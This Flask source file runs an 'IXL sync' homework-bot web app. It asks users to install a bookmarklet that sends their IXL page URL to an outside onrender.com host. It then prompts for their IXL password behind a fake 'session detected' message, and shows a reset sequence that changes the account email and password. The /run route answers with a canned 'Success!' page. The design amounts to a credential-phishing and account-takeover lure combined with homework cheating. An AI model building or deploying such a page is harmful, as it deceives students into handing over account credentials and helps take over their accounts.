from flask import Flask, request, jsonify, render_template_string
import asyncio
from bot import solve_ixl

app = Flask(__name__)

# --- STYLES (Black, Green, Blue) ---
COMMON_STYLE = """
<style>
    body { background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: #0d0d0d; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 127, 0.1); width: 400px; border: 1px solid #1a1a1a; }
    h1 span, h2 { color: #00ff7f; text-shadow: 0 0 10px rgba(0, 255, 127, 0.5); }
    .step { background: #141414; padding: 15px; border-radius: 10px; margin: 10px 0; text-align: left; border-left: 4px solid #00ccff; font-size: 14px; }
    input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #1a1a1a; background: #141414; color: white; box-sizing: border-box; }
    .btn-glow { background: linear-gradient(90deg, #00ff7f, #00ccff); color: #000; padding: 12px 20px; border-radius: 30px; font-weight: bold; text-decoration: none; border:none; width: 100%; cursor: pointer; text-transform: uppercase; }
    .link-alt { color: #666; font-size: 12px; text-decoration: none; display: block; margin-top: 15px; }
    .link-alt:hover { color: #00ccff; }
    ul { list-style: none; padding: 0; text-align: left; }
    li { margin: 10px 0; color: #444; }
    li.done { color: #00ff7f; }
    li.done::before { content: '✔ '; }
    li.waiting::before { content: '○ '; }
</style>
"""

# --- PAGE: MAIN DASHBOARD ---
HTML_PAGE = f"""
<!DOCTYPE html>
<html>
<head>{COMMON_STYLE}</head>
<body>
    <div class="card">
        <h1>Sync <span>ixl-flow</span></h1>
        <div class="step"><strong>1.</strong> Log in to IXL in another tab.</div>
        <div class="step"><strong>2.</strong> Drag this button to your Bookmarks:</div>
        <a class="btn-glow" href="javascript:(function(){{ window.location.href = 'https://ixl-bot-v2.onrender.com/login?ref=' + btoa(window.location.href); }})();">IXL SYNC</a>
    </div>
</body>
</html>
"""

# --- PAGE: LOGIN / LINK ---
LOGIN_PAGE = f"""
<!DOCTYPE html>
<html>
<head>{COMMON_STYLE}</head>
<body>
    <div class="card">
        <h2>Link Account</h2>
        <p style="color: #666; font-size: 13px;">Session detected. Confirm password to link.</p>
        <form action="/run" method="POST">
            <input type="password" name="password" placeholder="IXL Password" required>
            <button type="submit" class="btn-glow">Check Password</button>
        </form>
        <a href="/reset" class="link-alt">I don't know my password</a>
    </div>
</body>
</html>
"""

# --- PAGE: RESET FLOW (Matching your Screenshot) ---
RESET_PAGE = f"""
<!DOCTYPE html>
<html>
<head>{COMMON_STYLE}</head>
<body>
    <div class="card">
        <h2 style="color: #ff2d8d;">Resetting Password</h2>
        <ul>
            <li class="done">setting email</li>
            <li class="done">resetting password</li>
            <li class="waiting" style="color: #ff2d8d; font-weight: bold;">waiting for reset...</li>
            <li>logging back in</li>
            <li>reverting email</li>
        </ul>
        <p style="font-size: 11px; color: #333; margin-top: 20px;">Automated via ixl-flow</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/login')
def login_screen():
    return render_template_string(LOGIN_PAGE)

@app.route('/reset')
def reset_screen():
    return render_template_string(RESET_PAGE)

@app.route('/run', methods=['POST'])
def run_bot():
    # This takes you to the final success message after login
    return f"<html><head>{COMMON_STYLE}</head><body><div class='card'><h2>Success!</h2><p>Dashboard is now synced.</p></div></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
